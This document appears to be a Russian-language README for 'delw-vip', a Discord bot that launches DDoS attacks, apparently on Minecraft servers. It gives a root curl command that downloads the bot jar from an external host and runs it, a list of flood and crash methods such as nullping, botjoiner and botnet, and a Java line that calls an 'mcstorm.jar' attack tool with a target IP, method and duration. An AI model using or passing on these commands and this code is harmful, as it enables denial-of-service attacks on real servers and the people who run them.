```console
root@itskekoffcode:~$ curl -o delw-vip.jar http://f0652346.xsph.ru/vip.jar
root@itskekoffcode:~$ java -jar delw-vip.jar ТОКЕНБОТА
Запуск бота
Команды могут регистрироватся по часу! Возможные причины ошибок:
Вы не пригласили бота используя не только bot, но и application.commands
Не указан/неверный токен
Команды:
- /attack
- /methods (не работает)
- /credits
```
```console
root@itskekoffcode:-$ methods
Вот список методов:
join, default, legitjoin, localhost, invalidnames, longnames 
botjoiner, spoof, ping, nullping, multikiller, handshake, bighandshake, query 
bigpacket, network, randombytes, extremejoin, spamjoin, nettydowner, ram 
yoonikscry, colorcrasher, tcphit, tcpbypass, botnet, queue 
ultimatesmasher, sf, nabcry
Где default - ддос обычного бота DelW
```

> Заметка: В этом боте используется [KingDoS](https://discord.gg/mGRGpp9snr).
> Так же, рекомендуется запускать его на Windows Server. Или, если хотите на линукс, то уж, скомпильте сами.
> Поменяйте строчку [57](https://github.com/itskekoff/delw-vip/blob/f0269854e29f537ba653b48479bb8f95b36ab1d1/src/main/java/neko/itskekoff/discordddosbot/manager/impl/run.java#L57) на этот код:
```java
CommandExecutor.exec(String.format("java -jar ./server/jars/mcstorm.jar %s %d %s %d %s", ip, 340, method, time, "-1"));
```
Лю :blue_heart:
